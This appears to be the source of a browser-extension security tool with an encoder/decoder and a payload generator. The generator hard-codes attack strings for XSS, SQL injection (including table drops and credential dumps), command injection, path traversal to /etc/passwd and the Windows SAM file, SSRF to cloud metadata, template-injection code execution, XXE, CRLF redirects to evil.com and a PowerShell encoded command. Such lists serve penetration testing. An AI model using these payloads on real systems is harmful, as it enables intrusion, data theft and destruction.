import React, { useState, useEffect } from 'react';


type EncodingType = 'base64' | 'url' | 'html' | 'jwt';
type EncodingDirection = 'encode' | 'decode';
type PayloadCategory = 'xss' | 'sql' | 'cmd' | 'lfi' | 'ssrf' | 'rce' | 'ssti' | 'xxe' | 'crlf' | 'jsoni' | 'host' | 'Wnlfi';
type Payloads = Record<PayloadCategory, string[]>;

export const PayloadToolbox: React.FC = () => {

  const [activeTab, setActiveTab] = useState<'encoder' | 'generator' | 'support'>(() => {
    const saved = localStorage.getItem('cyberpost_activeTab');
    return (saved as 'encoder' | 'generator' | 'support') || 'encoder';
  });
  
  const [input, setInput] = useState(() => {
    return localStorage.getItem('cyberpost_input') || '';
  });
  
  const [output, setOutput] = useState(() => {
    return localStorage.getItem('cyberpost_output') || '';
  });
  
  const [encodingType, setEncodingType] = useState<EncodingType>(() => {
    const saved = localStorage.getItem('cyberpost_encodingType');
    return (saved as EncodingType) || 'base64';
  });
  
  const [direction, setDirection] = useState<EncodingDirection>(() => {
    const saved = localStorage.getItem('cyberpost_direction');
    return (saved as EncodingDirection) || 'encode';
  });
  
  const [copySuccess, setCopySuccess] = useState<{input: boolean; output: boolean; payloadId: string | null}>({input: false, output: false, payloadId: null});
  

  const [activeCategory, setActiveCategory] = useState<PayloadCategory>(() => {
    const saved = localStorage.getItem('cyberpost_activeCategory');
    return (saved as PayloadCategory) || 'xss';
  });
  

  useEffect(() => {
    localStorage.setItem('cyberpost_activeTab', activeTab);
  }, [activeTab]);
  
  useEffect(() => {
    localStorage.setItem('cyberpost_input', input);
  }, [input]);
  
  useEffect(() => {
    localStorage.setItem('cyberpost_output', output);
  }, [output]);
  
  useEffect(() => {
    localStorage.setItem('cyberpost_encodingType', encodingType);
  }, [encodingType]);
  
  useEffect(() => {
    localStorage.setItem('cyberpost_direction', direction);
  }, [direction]);
  
  useEffect(() => {
    localStorage.setItem('cyberpost_activeCategory', activeCategory);
  }, [activeCategory]);
  

  useEffect(() => {
    if (copySuccess.input || copySuccess.output || copySuccess.payloadId) {
      const timer = setTimeout(() => setCopySuccess({input: false, output: false, payloadId: null}), 2000);
      return () => clearTimeout(timer);
    }
  }, [copySuccess]);
  

  const payloads: Payloads = {
    xss: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">', 
      '<svg onload="alert(\'XSS\')">', 
      'javascript:alert("XSS")',
    ],
    sql: [
      '1\' OR \'1\'=\'1',
      '1; DROP TABLE users--',
      '\' UNION SELECT username,password FROM users--',
      'admin\'--',
    ],
    cmd: [
      '& whoami',
      '| cat /etc/passwd',
      '$(cat /etc/passwd)',
      '`id`',
    ],
    lfi: [
      '../../../etc/passwd',
      '../../../../../../../../etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      '/proc/self/environ',
    ],
    ssrf: [
      'http://169.254.169.254/latest/meta-data/',
      'http://127.0.0.1:8080/admin',
      'http://localhost:3000/internal/config',
      'file:///etc/passwd',
      'gopher://127.0.0.1:25/xHELO%20localhost',
    ],
    rce: [
      'system("id");',
      '`cat /etc/passwd`',
      'exec("/bin/bash -c \"whoami\"")',
      '{{7*7}}',
      ';netstat -an;',
      'powershell -e JABwAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5',
    ],
    ssti: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
      '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    ],
    xxe: [
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3000/internal"> ]><foo>&xxe;</foo>',
      '<!DOCTYPE request [<!ENTITY passwd SYSTEM "file:///etc/passwd">]><data>&passwd;</data>',
      '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><foo/>',
    ],
    crlf: [
      '\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 25\r\n\r\n<script>alert(1)</script>',
      '\r\nSet-Cookie: sessionid=INJECT\r\n',
      '\r\nLocation: https://evil.com\r\n',
      'param=test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E',
    ],
    jsoni: [
      '{"username":"admin", "password":{"$ne":"password"}}',
      '{"$where":"this.password==this.passwordConfirm"}',
      '{"username":{"$gt":""}}',
      '{"email": {"$regex": "admin"}}',
    ],
    host: [
      'Host: localhost',
      'Host: internal-system',
      'Host: 127.0.0.1',
      'Host: evil.com',
      'X-Forwarded-Host: evil.com',
      'X-Host: internal.example.com',
    ],
    Wnlfi: [
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      'C:\\boot.ini',
      '..\\..\\..\\..\\Windows\\win.ini',
      '..\\..\\..\\..\\boot.ini',
      'file:///C:/Windows/System32/config/SAM',
      'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\',
    ],
  };

  const handleEncodeOrDecode = () => {
    if (!input) {
      setOutput('');
      return;
    }
    
    try {
      if (encodingType === 'base64') {
        if (direction === 'encode') {
          setOutput(btoa(input));
        } else {
          setOutput(atob(input));
        }
      } else if (encodingType === 'url') {
        if (direction === 'encode') {
          setOutput(encodeURIComponent(input));
        } else {
          setOutput(decodeURIComponent(input));
        }
      } else if (encodingType === 'html') {
        if (direction === 'encode') {
          // Simple HTML encoding - in a real app use a proper library
          setOutput(
            input
              .replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#039;')
          );
        } else {
          // Simple HTML decoding - in a real app use a proper library
          setOutput(
            input
              .replace(/&amp;/g, '&')
              .replace(/&lt;/g, '<')
              .replace(/&gt;/g, '>')
              .replace(/&quot;/g, '"')
              .replace(/&#039;/g, '\'')
          );
        }
      } else if (encodingType === 'jwt') {
        if (direction === 'decode') {
          const parts = input.split('.');
          if (parts.length !== 3) throw new Error('Invalid JWT format');
          
          const decoded = {
            header: JSON.parse(atob(parts[0])),
            payload: JSON.parse(atob(parts[1])),
            signature: parts[2],
          };
          
          setOutput(JSON.stringify(decoded, null, 2));
        } else {
          // JWT encoding requires signing which we'd implement with a library in a real app
          setOutput('JWT encoding requires a proper library implementation');
        }
      }
    } catch (error) {
      setOutput(`Error: ${(error as Error).message}`);
    }
  };

  const handlePayloadSelect = (payload: string) => {
    setInput(payload);
  };

  const swapInputOutput = () => {
    setInput(output);
    setOutput(input);
  };

  const copyToClipboard = (text: string, target: 'input' | 'output' = 'input', payloadId: string | null = null) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        // Reset all states first, then set only the relevant one
        setCopySuccess({input: false, output: false, payloadId: null});
        
        // Now set the correct state
        if (target === 'input') {
          setCopySuccess({input: true, output: false, payloadId});
        } else {
          setCopySuccess({input: false, output: true, payloadId});
        }
      })
      .catch((err) => console.error('Failed to copy: ', err));
  };

  return (
    <div className="bg-cyber-dark text-white h-full">
      {/* Tabs */}
      <div className="bg-gray-900 border-b border-gray-700">
        <div className="flex">
          <button
            className={`px-4 py-2 font-medium text-sm transition-colors duration-200 ${activeTab === 'encoder' ? 'bg-gray-800 text-gray-100 border-t-2 border-cyber-cyan' : 'bg-gray-900 text-gray-400 hover:text-gray-300 hover:bg-gray-800'}`}
            onClick={() => setActiveTab('encoder')}
          >
            Encoder
          </button>
          <button
            className={`px-4 py-2 font-medium text-sm transition-colors duration-200 ${activeTab === 'generator' ? 'bg-gray-800 text-gray-100 border-t-2 border-cyber-cyan' : 'bg-gray-900 text-gray-400 hover:text-gray-300 hover:bg-gray-800'}`}
            onClick={() => setActiveTab('generator')}
          >
            Payload Generator
          </button>
          <button
            className={`px-4 py-2 font-medium text-sm transition-colors duration-200 ${activeTab === 'support' ? 'bg-gray-800 text-gray-100 border-t-2 border-cyber-cyan' : 'bg-gray-900 text-gray-400 hover:text-gray-300 hover:bg-gray-800'}`}
            onClick={() => setActiveTab('support')}
          >
            Credit/Support
          </button>
        </div>
      </div>
      
      {/* Encoder Tab */}
      {activeTab === 'encoder' && (
        <div className="p-4 flex flex-col h-full">
          {/* Controls Section - Top */}
          <div className="mb-6">
            <div className="flex items-center mb-4">
              <div className="flex items-center space-x-3">
                <div>
                  <div className="text-gray-200 text-sm font-medium mb-2">Type</div>
                  <select 
                    value={encodingType}
                    onChange={(e) => setEncodingType(e.target.value as EncodingType)}
                    className="bg-gray-800 border border-gray-700 rounded-md px-3 py-2 w-48 text-sm text-gray-200 focus:border-cyber-cyan focus:outline-none focus:ring-1 focus:ring-cyber-cyan"
                  >
                    <option value="base64">Base64</option>
                    <option value="url">URL</option>
                    <option value="html">HTML Entities</option>
                    <option value="jwt">JWT Decode</option>
                  </select>
                </div>
                <div>
                  <div className="text-gray-200 text-sm font-medium mb-2">Action</div>
                  
                  {/* زر Encode و Decode */}
                  <div className="flex space-x-2 mb-2">
                    <button 
                      className={`px-4 py-2 text-xs font-medium rounded-md transition-all duration-200 ${direction === 'encode' ? 'bg-cyber-green text-black' : 'bg-gray-700 hover:bg-gray-600 text-gray-200'}`}
                      onClick={() => {
                        setDirection('encode');
                        handleEncodeOrDecode();
                      }}
                    >
                      Encode
                    </button>
                    <button 
                      className={`px-4 py-2 text-xs font-medium rounded-md transition-all duration-200 ${direction === 'decode' ? 'bg-cyber-green text-black' : 'bg-gray-700 hover:bg-gray-600 text-gray-200'}`}
                      onClick={() => {
                        setDirection('decode');
                        handleEncodeOrDecode();
                      }}
                    >
                      Decode
                    </button>
                  </div>

                  {/* زر Swap أسفل الأزرار */}
                  <div className="flex">
                    <button 
                      onClick={swapInputOutput}
                      className="flex items-center justify-center bg-gray-700 hover:bg-gray-600 text-xs font-medium text-gray-200 rounded-md px-4 py-2 transition-all duration-200"
                      title="Swap Input and Output"
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5 mr-1.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
                      </svg>
                      Swap
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Input/Output Section - Bottom */}
          <div className="grid grid-cols-2 gap-4 relative">
            {/* Input Column */}
            <div>
              <div className="flex justify-between items-center mb-2">
                <div className="text-gray-200 text-sm font-medium">Input</div>
                <button 
                  onClick={() => copyToClipboard(input, 'input', null)}
                  className="bg-gray-700 hover:bg-gray-600 text-xs font-medium text-gray-200 rounded-md px-3 py-1.5 transition-colors duration-200 flex items-center"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                    <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
                    <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
                  </svg>
                  Copy
                  {copySuccess.input && copySuccess.payloadId === null && <span className="ml-1 text-cyber-green">✓</span>}
                </button>
              </div>
              <textarea 
                value={input}
                onChange={(e) => setInput(e.target.value)}
                className="w-full h-56 bg-gray-800 border border-gray-700 rounded-md p-3 text-gray-200 text-sm font-mono resize-none focus:border-cyber-cyan focus:outline-none focus:ring-1 focus:ring-cyber-cyan"
                placeholder="Enter text to encode or decode..."
                spellCheck="false"
              />
            </div>
            
            {/* Output Column */}
            <div>
              <div className="flex justify-between items-center mb-2">
                <div className="text-gray-200 text-sm font-medium">Output</div>
                <button 
                  onClick={() => copyToClipboard(output, 'output')}
                  className="bg-gray-700 hover:bg-gray-600 text-xs font-medium text-gray-200 rounded-md px-3 py-1.5 transition-colors duration-200 flex items-center"
                  disabled={!output}
                >
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                    <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
                    <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
                  </svg>
                  Copy
                  {copySuccess.output && <span className="ml-1 text-cyber-green">✓</span>}
                </button>
              </div>
              <textarea 
                value={output}
                readOnly
                className="w-full h-56 bg-gray-800 border border-gray-700 rounded-md p-3 text-gray-200 text-sm font-mono resize-none focus:border-cyber-cyan focus:outline-none"
                placeholder="Output will appear here..."
                spellCheck="false"
              />
            </div>
          </div>
        </div>
      )}
      
      {/* Payload Generator Tab */}
      {activeTab === 'generator' && (
        <div className="p-4 flex flex-col h-full">
          {/* Header with instructions */}
          <div className="mb-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-gray-200 font-medium">Payload Generator</h2>
              <div className="text-xs text-gray-400">Select a category and choose a payload</div>
            </div>
          </div>
          
          <div className="grid grid-cols-5 gap-6">
            {/* Categories Section - Left */}
            <div className="col-span-1">
              <div className="mb-3 text-sm text-gray-200 font-medium flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" />
                </svg>
                Categories
              </div>
              <div className="space-y-2">
                {Object.keys(payloads).map((category) => (
                  <button
                    key={category}
                    onClick={() => setActiveCategory(category as PayloadCategory)}
                    className={`w-full text-left text-xs px-3 py-2.5 rounded-md font-medium transition-colors duration-200 ${activeCategory === category ? 'bg-cyber-green text-black' : 'bg-gray-700 hover:bg-gray-600 text-gray-200'}`}
                  >
                    {category.toUpperCase()}
                  </button>
                ))}
              </div>
            </div>
            
            {/* Payloads Section - Right */}
            <div className="col-span-4">
              <div className="mb-3 text-sm text-gray-200 font-medium flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
                </svg>
                {activeCategory.toUpperCase()} Payloads
              </div>
              <div className="h-[28rem] overflow-y-auto border border-gray-700 rounded-md p-3 bg-gray-800 shadow-inner">
                <div className="space-y-2">
                  {payloads[activeCategory].map((payload, index) => {
                    const payloadId = `${activeCategory}-${index}`;
                    return (
                      <div key={index} className="flex justify-between items-center bg-gray-700 rounded-md p-2.5 hover:bg-gray-600 transition-colors duration-200">
                        <div className="text-xs text-gray-200 font-mono truncate flex-1 px-2">{payload}</div>
                        <div className="flex space-x-2 ml-2">
                          <button 
                            onClick={() => handlePayloadSelect(payload)}
                            className="bg-gray-600 hover:bg-gray-500 text-xs text-gray-200 font-medium rounded-md px-3 py-1.5 transition-colors duration-200 flex items-center"
                          >
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 20l4-16m2 16l4-16" />
                            </svg>
                            Use
                          </button>
                          <button 
                            onClick={() => copyToClipboard(payload, 'input', payloadId)}
                            className="bg-gray-600 hover:bg-gray-500 text-xs text-gray-200 font-medium rounded-md px-3 py-1.5 transition-colors duration-200 flex items-center"
                          >
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                              <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
                              <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
                            </svg>
                            Copy{copySuccess.payloadId === payloadId && <span className="ml-1 text-cyber-green">✓</span>}
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
            

          </div>
        </div>
      )}

      {activeTab === 'support' && (
        <div className="p-4 flex flex-col h-full">
          <div className="text-center mb-8 mt-4">
            <h2 className="text-2xl font-bold text-cyber-cyan mb-2">Ghostbyte<sup>®</sup></h2>
            <p className="text-gray-300 mb-6">Thank you for using CyberPost Lab Chrome Extension</p>
            
            <div className="flex flex-col items-center space-y-8">

              <div className="w-full max-w-md bg-gray-800 rounded-lg p-4 border border-gray-700 shadow-md">
                <h3 className="text-lg font-medium text-gray-200 mb-3 flex items-center justify-center">
                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" className="mr-2" viewBox="0 0 127.14 96.36">
                    <path fill="#5865f2" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
                  </svg>
                  Join Our Discord
                </h3>
                <a 
                  href="https://discord.gg/M9pg3dNmXN" 
                  target="_blank" 
                  rel="noreferrer noopener" 
                  className="bg-[#5865f2] hover:bg-[#4752c4] text-white font-medium py-2 px-4 rounded-md flex items-center justify-center transition-colors duration-200 w-full"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" className="mr-2" viewBox="0 0 127.14 96.36">
                    <path fill="#ffffff" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
                  </svg>
                  Connect on Discord
                </a>
              </div>
              

              <div className="w-full max-w-md bg-gray-800 rounded-lg p-4 border border-gray-700 shadow-md">
                <h3 className="text-lg font-medium text-gray-200 mb-3 flex items-center justify-center">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
                    <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
                    <path fillRule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clipRule="evenodd" />
                  </svg>
                  Support Our Work
                </h3>
                <p className="text-sm text-gray-400 mb-4 text-center">Your donations help us continue developing useful security tools</p>
                <div className="flex justify-center">
                  <a href="https://nowpayments.io/donation?api_key=9R33NDQ-WYAMMZJ-KKD7R7W-D5CH3R1" target="_blank" rel="noreferrer noopener">
                    <img src="https://nowpayments.io/images/embeds/donation-button-black.svg" alt="Crypto donation button by NOWPayments" className="transform hover:scale-105 transition-transform duration-200" />
                  </a>
                </div>
              </div>
            </div>
          </div>

          <div className="mt-auto text-center text-sm text-gray-500">
            <p>&copy; {new Date().getFullYear()} Ghostbyte<sup>®</sup>. All rights reserved.</p>
          </div>
        </div>
      )}
    </div>
  );
};